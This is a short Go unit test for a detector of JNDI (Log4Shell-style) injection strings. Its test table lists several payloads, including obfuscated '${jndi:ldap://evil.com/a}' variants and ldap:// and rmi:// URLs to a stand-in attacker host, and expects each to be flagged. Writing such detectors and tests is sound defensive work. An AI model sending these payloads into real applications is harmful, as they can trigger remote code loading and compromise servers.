// Copyright (c) 2026 erik <erik@erik.xyz> — https://erik.xyz

package injection

import "testing"

func TestJNDI(t *testing.T) {
	d := &JNDI{}
	tests := []struct {
		input  string
		should bool
	}{
		{"${jndi:ldap://evil.com/a}", true},
		{"${lower:j}ndi:ldap://evil.com/a}", true},
		{"${env:JAVA_HOME}", true},
		{"${::-j}${::-n}${::-d}${::-i}", true},
		{"ldap://evil.com/test", true},
		{"rmi://evil.com/exploit", true},
		{"normal text", false},
	}
	for _, tc := range tests {
		r := d.Detect(tc.input)
		if r.Detected != tc.should {
			t.Errorf("input=%q: got detected=%v, want %v", tc.input, r.Detected, tc.should)
		}
	}
}
